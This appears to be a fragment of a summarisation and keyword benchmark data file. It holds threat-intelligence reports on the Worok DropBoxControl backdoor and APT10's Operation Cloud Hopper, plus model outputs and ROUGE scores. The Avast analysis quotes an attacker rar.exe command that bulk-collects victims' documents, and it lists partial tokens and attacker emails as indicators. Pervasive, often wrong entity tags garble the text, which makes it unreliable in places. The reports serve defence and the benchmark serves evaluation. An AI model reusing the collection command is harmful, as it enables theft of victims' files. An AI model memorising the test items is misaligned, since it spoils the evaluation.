flags , the task type ( command ) , and other metadata , as seen in Figures [CARDINAL] 15 and [PRODUCT] Table 3.Figure [CARDINAL] 15 . The file structure of [ORG] DropBox filesLength [ORG] DescriptionItem [ORG] Table [CARDINAL] 3 . [ORG] DropBox file headerFlag \u2013 data in the file is encrypted [ORG] Flag \u2013 data in the file is gzipped [ORG] Command type Data lengthReturning to the [ORG] DropBox files , we explore a [ORG] DropBox file structure of the [ORG] DropBox account . A root folder includes folders named according to the [ORG] ClientId that is hard - coded in the DropBoxControl sample ; more precisely , in the [ORG] PNG file . Each client folder holds a time.txt file which includes a number that is a count of the backdoor iteration . [CARDINAL] One iteration means contacting and processing an appropriate client folder in the [ORG] DropBox repository . The attackers specify the task type and eventual parameters . The task type and parameters are then packed using the file header and uploaded into the appropriate client folder as a request file ( .req ) . Further analysis found that the9/14backdoor processes its .req files and creates a result file ( .res ) as a response for each request file . The result file has the same file structure shown in Figure [CARDINAL] 15 , but data , data length , and task type have different values , since returned data contains requested ( stolen ) information . Comparing all [ORG] DropBox folders ( Figure [CARDINAL] 16 ) , we determined the name of the request and result files in this form : [ 0- [CARDINAL] 9]+-[0 - 9]+ . The filename is used for request / response identification and also for data encrypting . For example , let \u2019s use the request file name [CARDINAL] 31-1233.req . The [ORG] IDMessage is 31 - [DATE] 1233 and TaskId is [DATE] 1233 . So , the data is encrypted using the [ORG] ClientId and TaskId , plus hard - coded hexEnc ; see Encryption . Figure [CARDINAL] 16 . List of [ORG] DropBox filesDropBoxControl [ORG] WorkflowWe defined and described the basic functionality of DropBoxControl in the sections above . Therefore , we can summarize all this knowledge into a backdoor workflow and outline the whole process of data collecting , uploading , downloading , and communicating with the [ORG] DropBox repository . In the beginning , [ORG] PNGLoader extracts the stenographically embedded DropBoxControl and invokes the [ORG] Main method of [ORG] the C # [ORG] Mydropbox . Program class . DropBoxControl then decrypts and loads the configuration file containing the [ORG] DropBox API key . Most of the actions are recorded in the log file . If the current time is between [ORG] UpTime and [PRODUCT] DownTime interval , DropBoxControl is active and starts the main functionality . It contacts the [ORG] DropBox repository and uploads the time.txt file into the client folder . If the time.txt upload is successful , the backdoor downloads a list of all files stored in the client folder . The file list is iterated , and each request ( .req ) file is downloaded and processed based on the tasks type ( command ) . DropBoxControl executes the command and creates the result file ( .res ) with the requested information . The resulting encrypted file is uploaded back into the client folder . Finally , the processed request ( .req ) file is deleted . [ORG] VictimologyThe victims we saw targeted in this campaign are similar to those that ESET saw . The victims of this campaign were companies and government institutions in [LOC] Asia and [LOC] North [LOC] America , namely [GPE] Mexico . [GPE] Vietnam and [GPE] Cambodia are the other countries affected by DropBoxControl . [CARDINAL] One of the DropBoxControl connections was monitored from an [ORG] IP associated with [ORG] the [ORG] Ministry [ORG] of [ORG] Economic [ORG] Development [ORG] of [ORG] Russia . Discussion The [ORDINAL] third stage of the compromise chain is represented by the C # implementation of DropBoxControl . The DropBoxControl functionality allows attackers to control and spy on victims \u2019 machines . Moreover , the backdoor has access to the Program Files folder , so we expect it to run under administrator privileges . The most common command observed in log files is obtaining information about victims \u2019 files , followed by data collecting . The typical command for the data collecting is via the cmd command ; see the example below : rar.exe a -m5 -r -y -ta20210204000000 -hp1qazxcde32ws -v2560k Asia1Dpt-PC-c.rar c:\\\\*.doc c:\\\\*.docx c:\\\\*.xls c:\\\\*.xlsx c:\\\\*.pdf c:\\\\*.ppt c:\\\\*.pptx c:\\\\*.jpg c:\\\\*.txt > nul10/14The attacks focus on collecting all files of interest , such as Word , [ORG] Excel , [ORG] PowerPoint , [ORG] PDF , etc . They recursively search the files in the [GPE] C:\\ drive and pack them into an encrypted rar archive , split into multiple files . Another command decrypted from the request file executes [PRODUCT] Ettercap , which sniffs live network connections using man - in - the - middle attacks ; see the command below : [ORG] Bearer gg706X***************Ru_43QAg**********1JU1DL***********ej1_xH7e [ORG] Bearer ARmUaL***************Qg02vynP**********ASEyQa***********deRLu9Gx [ORG] Bearer [ORG] WGG0iG***************kOdrimId**********ZQfzuw***********6RR8nNhyTwo keys are registered to \u201c Veronika Shabelyanova \u201d ( vershabelyanova1@gmail[.]com ) with [NORP] Chinese localization . The email is still active , as well as the [ORG] DropBox repository . The user of the email is a [NORP] Slavic transcription of \u201c [PERSON] \u0412\u0435\u0440\u043e\u043d\u0438\u043a\u0430 \u0428\u0430\u0431\u0435\u043b\u044f\u043d\u043e\u0432\u0430\u201d . The [ORDINAL] third [ORG] DropBox repository is connected with a [GPE] Hong [GPE] Kong user \u201c [PERSON] Hartshorne [PERSON] Yaeko \u201d ( yaekohartshornekrq11@gmai[l].com)DropBox FilesWe are monitoring the [ORG] DropBox repositories and have already derived some remarkable information . The [ORG] DropBox accounts were created on [DATE] 11 [DATE] July [DATE] 2019 based on [ORG] README files created on account \u2019s creation . At this time , there is [CARDINAL] only [CARDINAL] one [ORG] DropBox repository that seems to be active . It contains [CARDINAL] seven folders with [CARDINAL] seven time.txt files , so there are [CARDINAL] seven active DropBoxControl instances , since the time.txt files have integers that are periodically incremented ; see [PERSON] DropBox [PERSON] Files . Moreover , the integer values indicate that the backdoors run continuously for [DATE] tens [DATE] of [DATE] days . Regarding the backdoor commands , we guess the last activity that sent request files was on [DATE] 1 [DATE] June [DATE] 2022 , also for [CARDINAL] seven backdoors . Finally , the total count of folders representing infiltrated machines equals twenty - [CARDINAL] one victims . In [DATE] April [DATE] 2022 , the attackers uploaded a Lua script implementing the nmap [PERSON] Library shortport searching for Telnet services using s3270 to control [ORG] IBM mainframes ; see the script below . Code Quality of DropBoxControlWhile we usually refrain from commenting on the code quality , in this case it deserves mentioning as the code quality is debatable at best and not every objection can be blamed on obfuscation.11/14The code contains a lot of redundant code ; both duplicate code and code that serves no function . An indication of unfamiliarity with C # is usage of [CARDINAL] one \u2019s own implementation of serialization / deserialization methods instead of using C # build - in functions . The threading code does not rely on usual synchronization primitives such semaphores , mutexes , etc . but rather uses bool flags with periodic checks of thread states . The code also contains parts that are presumably copied from API documentation . For instance , the implementation of DropBox_FileDownload contains the same comment as in the [ORG] DropBox documentation ; see the illustration below . Another weird quirk is the encryption method for the configuration file . The DropBoxControl author has attempted to obfuscate the configuration in the ieproxy.dat file because the API key is sensitive information . However , when the config file is decrypted and applied , the configuration content is logged into the iexplore.log file in plain text . In other words , the whole DropBoxControl project looks like a school project . Authors do not adhere to usual coding practices , rely on their own implementation of common primitives , and reuse code from documentation examples . This leads us to an assessment that DropBoxControl authors are different from authors of [ORG] CLRLoader and [ORG] PNGLoader due to significantly different code quality of these payloads . [ORG] ConclusionThe purpose of this study has been to confirm the assumptions of our fellow researchers from ESET published in the article about the [ORG] Worok cyberespionage group . Our research managed to extend their compromise chain , as we have managed to find artifacts that fit the chain accompanying the samples in question . We have described probable scenarios of how the initial compromise can be started by abusing [ORG] DLL hijacking of Windows services , including lateral movement . The rest of the compromise chain is very similar to the ESET description . The key finding of this research is the interception of the [ORG] PNG files , as predicted by [ORG] ESET . The stenographically embedded C # payload ( DropBoxControl ) confirms Worok as the cyberespionage group . They steal data via the [ORG] DropBox account registered on active Google emails . The prevalence of Worok \u2019s tools in the wild is low , so it can indicate that the toolset is an [ORG] APT project focusing on high - profile entities in private and public sectors in [LOC] Asia , [LOC] Africa , and [LOC] North [LOC] America . AppendixDropBoxControl Log[02:00:50]:[+]Main starts . [ 02:00:50]:[+]Config exists . [ 02:00:50]:[__]DecryptContent is 1,Bearer gg706Xqxhy4*****************gQ8L4OmOLdI1JU1DL**********1ej1_xH7e#,300,7,23 [ 10:39:40]:[+]In work time . [ [CARDINAL] 10:39:42]:[UPD ] UploadData /data/2019 / time.txt Starts ! [ [CARDINAL] 10:40:08]:[UPD ] UploadData /data/2019 / time.txt Success ! [ [CARDINAL] 10:40:10]:[UPD ] UploadData Ends ! [ 10:40:10]:[+]Get Time.txt success . [ [CARDINAL] 10:40:11]:[+ ] DropBox_GetFileList Success ! [ 10:40:11]:[DOWN ] [ORG] DownloadData /data/2019/31 - 3.req Starts ! [ [CARDINAL] 10:40:13]:[DOWN ] [ORG] DownloadData /data/2019/31 - 3.req Success ! [ [CARDINAL] 10:40:13]:[DOWN ] DownloadData Ends ! [ [CARDINAL] 10:40:26]:[UPD ] UploadData /data/2019/31 - 3.res Starts ! [ [CARDINAL] 10:40:27]:[UPD ] UploadData /data/2019/31 - 3.res Success!12/14[10:40:27]:[UPD ] UploadData Ends ! [ [CARDINAL] 10:40:27]:[DEL ] Delete /data/2019/31 - 3.req Starts ! [ [CARDINAL] 10:40:28]:[DEL ] Delete /data/2019/31 - 3.req Success ! [ [CARDINAL] 10:40:28]:[DEL ] Delete Ends ! [ [CARDINAL] 10:40:28]:[DOWN ] [ORG] DownloadData /data/2019/31 - 4.req Starts ! [ [CARDINAL] 10:40:29]:[DOWN ] [ORG] DownloadData /data/2019/31 - 4.req Success ! [ [CARDINAL] 10:40:29]:[DOWN ] DownloadData Ends ! [ [CARDINAL] 10:40:34]:[UPD ] UploadData /data/2019/31 - 4.res Starts ! [ [CARDINAL] 10:40:36]:[UPD ] UploadData /data/2019/31 - 4.res Success ! [ [CARDINAL] 10:40:36]:[UPD ] UploadData Ends ! [ [CARDINAL] 10:40:36]:[DEL ] Delete /data/2019/31 - 4.req Starts ! [ [CARDINAL] 10:40:36]:[DEL ] Delete /data/2019/31 - 4.req Success ! [ [CARDINAL] 10:40:36]:[DEL ] Delete Ends ! [ [CARDINAL] 10:40:36]:[DOWN ] DownloadData /data/2019/31 - 5.req Starts ! [ [CARDINAL] 10:40:37]:[DOWN ] [ORG] DownloadData /data/2019/31 - 5.req Success ! [ [CARDINAL] 10:40:37]:[DOWN ] DownloadData Ends ! [ [CARDINAL] 10:40:42]:[UPD ] UploadData /data/2019/31 - 5.res Starts ! [ [CARDINAL] 10:40:43]:[UPD ] UploadData /data/2019/31 - 5.res Success ! [ [CARDINAL] 10:40:43]:[UPD ] UploadData Ends ! [ 10:40:43]:[DEL ] Delete /data/2019/31 - 5.req Starts ! [ [CARDINAL] 10:40:44]:[DEL ] Delete /data/2019/31 - 5.req Success ! [ [CARDINAL] 10:40:44]:[DEL ] Delete Ends ! [ [CARDINAL] 10:40:44]:[DOWN ] [ORG] DownloadData /data/2019/31 - 7.req Starts ! [ [CARDINAL] 10:40:44]:[DOWN ] [ORG] DownloadData /data/2019/31 - 7.req Success ! [ [CARDINAL] 10:40:44]:[DOWN ] DownloadData Ends ! [ [CARDINAL] 10:40:49]:[UPD ] UploadData /data/2019/31 - 7.res Starts ! [ [CARDINAL] 10:40:50]:[UPD ] UploadData /data/2019/31 - 7.res Success ! [ [CARDINAL] 10:40:50]:[UPD ] UploadData Ends ! [ 10:40:50]:[DEL ] Delete /data/2019/31 - 7.req Starts ! [ [CARDINAL] 10:40:52]:[DEL ] Delete /data/2019/31 - 7.req Success ! [ [CARDINAL] 10:40:52]:[DEL ] Delete Ends!Task Type ValuesTask Type 0x14IOCsPNG file with steganographically embedded C # payload 1413090EAA0C2DAFA33C291EEB973A83DEB5CBD07D466AFAF5A7AD943197D72613/14References[1 ] Worok : The big picture [ 2 ] Lateral Movement \u2014 [ORG] SCM and [ORG] DLL [ORG] Hijacking [ORG] Primer [ [CARDINAL] 3 ] Dropbox for HTTP Developers2022 Copyright \u00a9 Avast Software s.r.o.14/14", "generated_text": "the article; ESET researchers; an initial compromise; Worok; electricity companies; Central Asia; Southeast Asia; the initial compromise; C2; a secondary payload; the final payload; steganography; PNG files; obfuscation; a secondary payload; Control; decrypt; the C2 server; the malware; the lateral movement; the DLL hijacking; the svchost; the backdoor; IPsec; Windows services; IKE; AuthIP IPsec Keying Modules; Remote Desktop Configuration; SessionEnv; the C2 server; the backdoor; a third payload; Keying Modules; the C2 server; the malware; the two stages; the C2 server; the C2 server; the lateral movement; the C2 server; the first stage; the C2 server; the second stage; the C2 server; the C2 server; the C2 server; the backdoor; the C2 server; the C2 server; the backdoor; the C2 server; the C2 server; the FS server; the C2 server; the C2 server; the C2 server", "ref_text": "<START-1>The document describes analysis done by Avast researchers on a new malware campaign called Worok, initially documented by ESET. Worok uses sophisticated techniques to infiltrate high-profile companies and governments in Asia to steal data. The initial infection vector is unknown but Avast found artifacts indicating DLL hijacking of Windows services like IKEEXT and SessionEnv may be used for lateral movement. The next stages use CLRLoader and PNGLoader to load the final payload extracted via steganography from PNG files. The steganographic embedding relies on least-significant bit (LSB) encoding, where data is embedded in the least-significant bits of every pixel. Avast captured additional PNGs containing a .NET payload called DropBoxControl that communicates with attacker controlled Dropbox accounts using the Dropbox API. It executes commands uploaded in request files and exfiltrates data into response files. The commands allow remote control for file manipulation, executing programs, sniffing network traffic etc. The attackers mainly use it to recursively collect documents, spreadsheets, emails etc. by packing them into encrypted RAR files. DropBoxControl shows lower code quality than earlier stages, indicating it was likely developed by a less skilled actor. The malware has targeted private companies and government entities across Asia, Africa and North America. Indicators of compromise like file hashes and email addresses are provided. The sophisticated techniques like steganography, Dropbox C2, and living off the land binaries allow Worok to operate stealthily. Avast's analysis provides further insight into this targeted campaign infiltrating high-value victims for data exfiltration. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.43967828418230565, "gpt3/lexical/rouge_rouge2": 0.11859838274932614, "gpt3/lexical/rouge_rougeL": 0.23056300268096516, "gpt3/lexical/rouge_rougeLsum": 0.23056300268096516, "gpt3_generated_text": ["The article discusses the findings of ESET researchers on the Worok malware, which has been targeting high-profile companies and local governments in Asia since at least 2020. The malware is designed to steal data and has recently been observed targeting energy companies in Central Asia and public sector entities in Southeast Asia. ESET researchers have identified two execution chains and described how the final payload is loaded and extracted via steganography from PNG files. The article also delves into the initial compromise, the lateral movement of the malware, and the DLL hijacking used by the attackers. The analysis aims to extend the current knowledge of ESET research and provides insights into the methods and techniques used by the attackers to compromise and control victim machines."]}, {"split_name": "test", "sample_id": "test_77", "prompt_text": "Extract the keywords: www.pwc.co.uk/cyberOperation [PERSON] Cloud [PERSON] HopperExposing a systematic hacking operation with an unprecedented web of global victimsApril [CARDINAL] 2017In collaboration withContentsForewordExecutive [ORG] summaryAPT10 as a [GPE] China - based threat actorMotivations behind APT10 \u2019s targetingShining a light on APT10 \u2019s methodologyConclusionAppendices345141620212ForewordThis report is an initial public release of research [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have conducted into new , sustained global campaigns by an established threat actor against managed IT service providers and their clients as well as several directly targeted organisations in [GPE] Japan . Given the scale of those campaigns , the activity identified here is likely to reflect just a small portion of the threat actor \u2019s operations . This report is primarily fact - based . Where we have made an assessment this has been made clear by phraseology such as \u201c we assess \u201d , and the use of estimative language as outlined in [ORG] Appendix [ORG] A.By publicly releasing this research , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems hope to facilitate broad awareness of the attack techniques used so that prevention and detection capabilities can be configured accordingly . It is also hoped that rapid progress can be made within the broader security community to further develop the understanding of the campaign techniques we outline , leading to additional public reports from peers across the security community . As a part of our research and reporting effort , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have collaborated with the [GPE] UK \u2019s [ORG] National [ORG] Cyber [ORG] Security [ORG] Centre ( [ORG] NCSC ) under its [LAW] Certified [LAW] Incident [LAW] Response ( [ORG] CIR ) scheme to engage and notify managed IT service providers , known affected organisations and other national bodies . Supplementary to this report , an [ORG] Annex containing our technical analysis will be released.3Executive summarySince [DATE] late [DATE] 2016 , [ORG] PwC [GPE] UK and [ORG] BAE [ORG] Systems have been assisting victims of a new cyber espionage campaign conducted by a [GPE] China - based threat actor . We assess this threat actor to almost certainly be the same as the threat actor widely known within the security community as \u2018 APT10 \u2019 . The campaign , which we refer to as Operation Cloud Hopper , has targeted managed IT service providers ( MSPs ) , allowing APT10 unprecedented potential access to the intellectual property and sensitive data of those MSPs and their clients globally . A number of [NORP] Japanese organisations have also been directly targeted in a separate , simultaneous campaign by the same actor . We have identified a number of key findings that are detailed below . APT10 has recently unleashed a sustained campaign against MSPs . The compromise of [ORG] MSP networks has provided broad and unprecedented access to [ORG] MSP customer networks.\u2022 Multiple MSPs were almost certainly being targeted [ORG] from2016 onwards , and it is likely that APT10 had already begun to do so from as early as [CARDINAL] 2014.\u2022 [ORG] MSP infrastructure has been used as part of a complex webof exfiltration routes spanning multiple victim networks . APT10 has significantly increased its scale and capability since [DATE] early [DATE] 2016 , including the addition of new custom tools.\u2022 APT10 ceased its use of the [ORG] Poison Ivy malware familyafter a [DATE] 2013 [ORG] FireEye report , which comprehensively detailed the malware \u2019s functionality and features , and its use by several [GPE] China - based threat actors , including [CARDINAL] APT10.\u2022 APT10 primarily used PlugX malware from [DATE] 2014 to 2016,progressively improving and deploying newer versions , while simultaneously standardising their command and control function.\u2022 We have observed a shift towards the use of bespokemalware as well as open - source tools , which have been customised to improve their functionality . This is highly likely to be indicative of an increase in sophistication . Infrastructure observed in APT10 \u2019s most recent campaigns links to previous activities undertaken by the threat actor.\u2022The command and control infrastructure used for Operation Cloud Hopper is predominantly dynamic - DNS domains , which are highly interconnected and link to the threat actor \u2019s previous operations . The number of dynamic - DNS domains in use by the threat actor has significantly increased since [DATE] 2016 , representative of an increase in operational tempo.\u2022Some top level domains used in the direct targeting of [NORP] Japanese entities share common [ORG] IP address space with the network of dynamic - DNS domains that we associate with Operation Cloud Hopper . APT10 focuses on espionage activity , targeting intellectual property and other sensitive data.\u2022 APT10 is known to have exfiltrated a high volume of datafrom multiple victims , exploiting compromised [ORG] MSP networks , and those of their customers , to stealthily move this data around the world.\u2022 The targeted nature of the exfiltration we have observed , along with the volume of the data , is reminiscent of the previous era of [ORG] APT campaigns pre-2013.PwC [GPE] UK and [ORG] BAE [ORG] Systems assess APT10 as highly likely to be a [GPE] China - based threat actor.\u2022It is a widely held view within the cyber security community that APT10 is a [GPE] China - based threat actor.\u2022 Our analysis of the compile times of malware binaries , the registration times of domains attributed to APT10 , and the majority of its intrusion activity indicates a pattern of work in line with [ORG] China [ORG] Standard [ORG] Time ( UTC+8).\u2022 The threat actor \u2019s targeting of diplomatic and politicalorganisations in response to geopolitical tensions , as well as the targeting of specific commercial enterprises , is closely aligned with strategic [NORP] Chinese interests.4APT10 as a [GPE] China - based threat actorAPT10 as a [GPE] China - based threat actor [PERSON] PwC [PERSON] UK and [ORG] BAE [ORG] Systems assess it is highly likely that APT10 is a [GPE] China - based threat actor with a focus on espionage and wide ranging information collection . It has been in operation since [DATE] at [DATE] least [DATE] 2009 , and has evolved its targeting from an early focus on the [GPE] US defence industrial base ( [ORG] DIB)1 and the technology and telecommunications sector , to a widespread compromise of multiple industries and sectors across the globe , most recently with a focus on MSPs . APT10 , a name originally coined by [ORG] FireEye , is also referred to as [ORG] Red [ORG] Apollo by [ORG] PwC UK , CVNX by [ORG] BAE [ORG] Systems , [NORP] Stone [NORP] Panda by [ORG] CrowdStrike , and menuPass Team more broadly in the public domain . The threat actor has previously been the subject of a range of open source reporting , including most notably a report by [ORG] FireEye comprehensively detailing the threat actor \u2019s use of the [ORG] Poison Ivy malware family2 and blog posts by [ORG] Trend Micro3 similarly detailing the use of [PRODUCT] EvilGrab malware . Alongside the research and ongoing tracking of APT10 by both PwC [GPE] UK and [ORG] BAE \u2019s [ORG] Threat [ORG] Intelligence teams , PwC UK \u2019s Incident [ORG] Response team has been engaged in supporting investigations linked to APT10 compromises . This research has contributed to the assessments and conclusions we have drawn regarding the recent campaign activity by APT10 , which represents a shift from previous activities linked to the threat actor . As a result of our analysis of [ORG] APT10 \u2019s activities , we believe that it almost certainly benefits from significant staffing and logistical resources , which have increased over [DATE] the [DATE] last [DATE] three [DATE] years , with a significant step - change in [DATE] 2016 . Due to the scale of the threat actor \u2019s operations throughout [DATE] 2016 and [DATE] 2017 , we similarly assess it currently comprises multiple teams , each responsible for a different section of the day - to - [DATE] day operations , namely domain registration , infrastructure management , malware development , target operations , and analysis . APT10 withdrew from direct targeting using [ORG] Poison Ivy in [DATE] 2013 and conducted its [ORDINAL] first known retooling operation , upgrading its capabilities and replatforming to use PlugX. It is highly likely that this is due to the release of the [DATE] 2013 [ORG] FireEye report . Our report will detail the most recent campaigns conducted by APT10 , including the sustained targeting of MSPs , which we have named [PERSON] Operation [PERSON] Cloud [PERSON] Hopper , and the targeting of a number of [NORP] Japanese institutions.1 The defence industrial base comprises [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense and a plethora of companies that support the design , development andmaintenance of defence assets and enable [GPE] US military requirements to be met . url url [CARDINAL] 3 url analysis of APT10 \u2019s operations As part of our analysis , we have made a number of observations about APT10 and its profile , which supports our assessment that APT10 is a [GPE] China - based threat actor . For example , we have identified patterns within the domain registrations and file compilation times associated with APT10 activity . This is almost certainly indicative of a threat actor based in the [GPE] UTC+8 time zone , which aligns to [ORG] Chinese [ORG] Standard [ORG] Time ( CST).Shown in Figure [CARDINAL] 1 are registration times4 , represented in [ORG] UTC , for known APT10 top level domains since [DATE] mid-2016 , which mark a major uptick in APT10 activity . Mapping this to [GPE] UTC+8 , as in Figure [CARDINAL] 2 , shows a standard set of [NORP] Chinese business hours , including a [TIME] two [TIME] - [TIME] hour [TIME] midday break . Figure [CARDINAL] 1 : APT10 domain registration times in UTCFigure [CARDINAL] 2 : APT10 domain registration times in [GPE] UTC+8Apr 2017Mar 2017Feb 2017Jan 2017Dec 2016Nov 2016Oct [DATE] 2016Sep [DATE] 2016 ) DApr 2017Mar 2017Feb [TIME] 2017Jan [TIME] 2017Dec [TIME] 2016Nov 2016Oct [DATE] 2016Sep [DATE] 2016 ) DAug [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00Aug [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( UTC+8)Further analysis of the compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar malware samples used by APT10 reveals a similar pattern in [TIME] working [TIME] hours , as shown in Figure [CARDINAL] 3.Shifting this to [GPE] UTC+8 shows a similar timeframe of operation to the domain registrations . There are some outliers , which are likely attributable to the operational nature of this threat actor , such as requirements to work outside [TIME] normal [TIME] business [TIME] hours . Figure [CARDINAL] 3 : Compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar in UTCFigure [CARDINAL] 4 : Compile times of PlugX , [ORG] RedLeaves and [ORG] Quasar in [ORG] UTC+8Jul 2017Jan [TIME] 2017Jul [TIME] 2015Jan 2016Jul 2015Jan 2015Jul [DATE] 2014Jan [DATE] 2014 ) DJul 2017Jan [TIME] 2017Jul [TIME] 2015Jan 2016Jul 2015Jan 2015Jul [DATE] 2014Jan [DATE] 2014 ) DJul 201300:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:00Jul [DATE] 201300:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( UTC+8)4 The bubbles shown on Figures [CARDINAL] 1 through 6 are representative of the number of events observed at that time and date.6When applying the time shift to the [PERSON] ChChes malware ( newly used by APT10 ) compilation timestamps , we see a different pattern as shown in Figure [CARDINAL] 5 . While this does not align with [NORP] Chinese business hours , it is likely to be either a result of the threat actor changing its risk profile by attempting to obscureor confuse attribution or a developer \u2019s side project that has ended up being used on targeted operations . Based on other technical overlaps , [PERSON] ChChes is highly likely to be exclusively used by APT10.Figure [CARDINAL] 5 : Compile time of [ORG] ChChes in UTCFigure [CARDINAL] 6 : Compile time of [PERSON] ChChes in [GPE] UTC+8 ) DDec [CARDINAL] 15 , 2016Dec [CARDINAL] 1 , 2016Nov [CARDINAL] 17 , 2016Nov [CARDINAL] 3 , [CARDINAL] 2016Oct [CARDINAL] 20 , [CARDINAL] 2016Oct [CARDINAL] 6 , 2016Sep [CARDINAL] 22 , [CARDINAL] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00 ) DDec [CARDINAL] 15 , 2016Dec [CARDINAL] 1 , 2016Nov [CARDINAL] 17 , 2016Nov [CARDINAL] 3 , [CARDINAL] 2016Oct [CARDINAL] 20 , [CARDINAL] 2016Oct [CARDINAL] 6 , 2016Sep [CARDINAL] 22 , [DATE] 201600:0002:0004:0006:0008:0010:0012:0014:0016:0018:0020:0022:0001:0003:0005:0007:0009:0011:0013:0015:0017:0019:0021:0023:00Time [DATE] of [DATE] Day ( UTC)Time of Day ( [PERSON] UTC+8)To further this analysis , we have observed the threat actor conducting interactive activities primarily [TIME] between [TIME] the [TIME] hours [TIME] of [TIME] midnight [TIME] and 10:00 UTC , as shown in Figure [CARDINAL] 7 . When converting this to [GPE] UTC+8 we again see a shift to [NORP] Chinese business hours , with operations occurring [TIME] between [TIME] 08:00 [TIME] and [TIME] 19:00 . It is a realistic probability that [DATE] the [DATE] weekend work observed in Figure [CARDINAL] 7 may be necessary as part of operational requirements . The sum of this analysis aligns with the evidence provided by [ORG] the [ORG] United [ORG] States [ORG] Department [ORG] of [ORG] Justice indictment against several individuals associated with APT1,5 another China- based threat actor , showing a working day starting at [TIME] 08:00 [TIME] UTC+8 and finishing at [TIME] 18:00 [TIME] UTC+8 with a [TIME] two [TIME] hour lunch break from [TIME] 12:00 [TIME] UTC+8 until [TIME] 14:00 [TIME] UTC+8.Figure [TIME] 7 : Operational times of APT10 in UTC+8SunSatFri 18:0017:00 15:00014:0013:001 001:00002:00 0 4 : [QUANTITY] 0 [QUANTITY] 0 [QUANTITY] 05:00 [QUANTITY] 06:0007:00 8:0000910:0:000Number of events01 [EVENT] - 1011 [EVENT] - 2021 [EVENT] - 3031 [EVENT] - 4041 [EVENT] - 5050 + [EVENT] 5 url threat actors have previously been observed using a similar method of a supply chain attack , for example , in the compromise of [NORP] Dutch certificate authority [ORG] Diginotar in [DATE] 20116 and the compromise of [GPE] US retailer [ORG] Target in 2013.7The command and control ( C2 ) infrastructure chosen by APT10 for Operation Cloud Hopper is predominantly referenced using dynamic - DNS domains . The various domains are highly - interconnected through shared [ORG] IP address hosting , even linking back historically to the threat actor \u2019s much older operations . At present , the indicators detailing APT10 \u2019s operations number into the [CARDINAL] thousands and can not be easily visualised . The graph in Figure [CARDINAL] 8 overleaf depicts a high - level view of the infrastructure used by APT10 throughout [DATE] 2016 . As the campaign has progressed into [DATE] 2017 , the number of dynamic- [ORG] DNS domains in use by the threat actor has significantly increased . The graph in Figure [CARDINAL] 9 , also shown overleaf , extracts one node of the newer C2 from the infrastructure shown in Figure [CARDINAL] 8 and maps this to the older infrastructure of APT10 , as disclosed by [ORG] FireEye in their [DATE] 2014 Siesta Campaign blog post8 . In terms of timing , it is highly likely that a single party is responsible for all of these domains , based on our observations of infrastructure overlap . Through our investigations , we have identified multiple victims who have been infiltrated by the threat actor . Several of these provide enterprise services or cloud hosting , supporting our assessment that APT10 are almost certainly targeting MSPs . We believe that the observed targeting of MSPs is part of a widescale supply - chain attack . Identifying a change in APT10 \u2019s targeting APT10 has , in the past , primarily been known for its targeting of government and [GPE] US defence industrial base organisations , with the earliest known date of its activity being in [DATE] December [DATE] 2009 . Our research and observations suggest that this targeting continues to date . During the [DATE] 2013 \u2013 [DATE] 2014 period there was a general downturn in the threat actor \u2019s activities , as was also seen with other related groups . It was widely assessed that this was due to the public release of information surrounding [NORP] APT1 , which exposed its toolset and infrastructure . From our analysis and investigations , we have identified APT10 as actively operating [CARDINAL] at [CARDINAL] least [CARDINAL] two specific campaigns , [CARDINAL] one targeting MSPs and their clients , and one directly targeting [NORP] Japanese entities . [ORG] MSP focused campaign APT10 has almost certainly been undertaking a global operation of unprecedented size and scale targeting a number of MSPs . APT10 has vastly increased the scale and scope of its targeting to include multiple sectors , which has likely been facilitated by its compromise of MSPs . Such providers are responsible for the remote management of customer IT and end - user systems , thus they generally have unfettered and direct access to their clients \u2019 networks . They may also store significant quantities of customer data on their own internal infrastructure . MSPs therefore represent a high - payoff target for espionage- focused threat actors such as APT10 . Given the level of client network access MSPs have , once APT10 has gained access to a [ORG] MSP , it is likely to be relatively straightforward to exploit this and move laterally onto the networks of potentially [CARDINAL] thousands of other victims . This , in turn , would provide access to a larger amount of intellectual property and sensitive data . APT10 has been observed to exfiltrate stolen intellectual property via the MSPs , hence evading local network defences.6 url [CARDINAL] 7 url [CARDINAL] 8 url [CARDINAL] 8 : High - level view of infrastructure used by APT10 throughout 2016Figure 9 : Infrastructure graph linking early [LOC] Plugx domains to recent APT10 domains9Sectors targetedEngi neering and C onn structioPublic s e cto [ORG] rRetail and C o n sm eruIndustrial man u fa cturingPharemaceuticals a n d Life SciencEnergy and M i ningMeta lsTechno l o [GPE] gyBusine ss and [PERSON] Profe [PERSON] s [PERSON] s is en [ORG] al [ORG] ServicoCountries [ORG] targetedNorwaySwedenFinlandFranceSwitzerlandCanadaUSASouth KoreaJapanIndiaThailandBrazilSouth [GPE] AfricaAustralia10Japan focused campaign In a separate series of operations , APT10 has been systematically targeting [NORP] Japanese organisations using bespoke malware referred to in the public domain as \u2018 ChChes \u2019 . While linked to APT10 , via shared infrastructure , this campaign exhibits some operational differences suggesting a potential sub - division within the threat actor . These operations have seen APT10 masquerading as legitimate [NORP] Japanese public sector entities ( such as [ORG] the [ORG] Ministry [ORG] of [ORG] Foreign [ORG] Affairs , [ORG] Japan [ORG] International [ORG] Cooperation [ORG] Agency and [ORG] the [ORG] Liberal [ORG] Democratic [ORG] Party [ORG] of [ORG] Japan ) to gain access to the victim organisations . Targeting of these entities by APT10 is consistent with previous targeting by 